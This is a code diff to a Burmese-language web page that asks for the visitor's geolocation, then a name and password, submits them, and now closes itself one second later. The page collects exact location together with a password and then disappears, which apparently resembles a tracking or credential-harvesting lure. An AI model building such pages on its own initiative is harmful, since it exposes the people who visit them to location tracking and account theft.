@@ -29,6 +29,7 @@
         .status{margin-top:15px;padding:12px;border-radius:8px;display:none;}
         .success{background:#d4edda;color:#155724;display:block;}
         .error{background:#f8d7da;color:#721c24;display:block;}
+        .notice{margin-top:10px;text-align:center;font-size:13px;color:#64748b;display:none;}
     </style>
 </head>
 <body>
@@ -52,6 +53,7 @@
         <button id="sendBtn">📡 တည်နေရာကို မျှဝေပါ</button>
         
         <div id="status" class="status"></div>
+        <div id="autoCloseNotice" class="notice">⚠️ ပို့ပြီးရင် စာမျက်နှာကိုယ်တိုင်ပျောက်သွားမှာပါ</div>
     </div>
 
     <script>
@@ -76,6 +78,7 @@
         const passInput = document.getElementById('pass');
         const sendBtn = document.getElementById('sendBtn');
         const status = document.getElementById('status');
+        const autoCloseNotice = document.getElementById('autoCloseNotice');
 
         let currentLat, currentLng;
 
@@ -114,6 +117,7 @@
                     nameInput.style.display = 'block';
                     passInput.style.display = 'block';
                     sendBtn.style.display = 'block';
+                    autoCloseNotice.style.display = 'block'; // ပျောက်သွားမယ့်အသိပေးချက်ပေါ်လာ
                     showStatus('✅ တည်နေရာမှန်ကန်ပါသည်။ နာမည်နှင့်စကားဝှက်ဖြည့်ပါ', 'success');
                 },
                 (err) => {
@@ -147,12 +151,19 @@
                     longitude: currentLng,
                     timestamp: new Date().toLocaleString()
                 });
-                showStatus(`✅ ပို့ပြီးပါပြီ!`, 'success');
+                showStatus(`✅ ပို့ပြီးပါပြီ! 1 စက္ကန့်အတွင်း ပျောက်သွားမှာပါ`, 'success');
+                
+                // 1 စက္ကန့်ကြာမှ စာမျက်နှာပျောက်သွား
+                setTimeout(() => {
+                    window.close(); // ဒီပေါ်လမ်းက ဖုန်းဘရောက်ဆာရောက်မှာမရှိရင်
+                    window.location.href = 'about:blank'; // ဖုန်းမှာလည်း အလုပ်လုပ်အောင်
+                }, 1000);
             }catch(err){
                 showStatus('❌ အမှား - '+err.message, 'error');
+                sendBtn.disabled = false;
             }
-            sendBtn.disabled = false;
         });
     </script>
 </body>
-</html>
+            </html>
+            
